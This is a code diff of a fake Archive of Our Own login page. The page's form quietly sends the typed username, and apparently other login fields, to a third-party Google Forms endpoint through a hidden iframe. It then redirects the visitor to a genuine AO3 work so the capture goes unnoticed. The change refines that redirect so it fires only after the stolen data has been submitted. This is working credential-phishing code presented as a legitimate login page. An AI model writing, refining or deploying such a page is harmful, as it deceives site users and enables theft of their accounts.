@@ -116,23 +116,17 @@
  If you don't have an account, you can <a href=https://archiveofourown.org/invite_requests>request an invitation to join</a>.
  </p>
 <div id="loginform">
-  <script type="text/javascript">
-    function handleSubmit() {
-      setTimeout(function() {
-        window.location.href = 'https://archiveofourown.org/works/21065363';
-      }, 500);
-    }
+  <script>
+    var isSubmitted = false;
   </script>
-
-  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
+          onload="if(isSubmitted) { window.location.href='https://archiveofourown.org/works/21065363'; }">
+  </iframe>
   <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" 
         method="POST" 
         target="hidden_iframe" 
-        onsubmit="handleSubmit();">
-        
+        onsubmit="isSubmitted = true;">
     <dl>
-
       <dt><label>Username:</label></dt>
       <dd><input type="text" name="entry.996873737" required></dd>
 
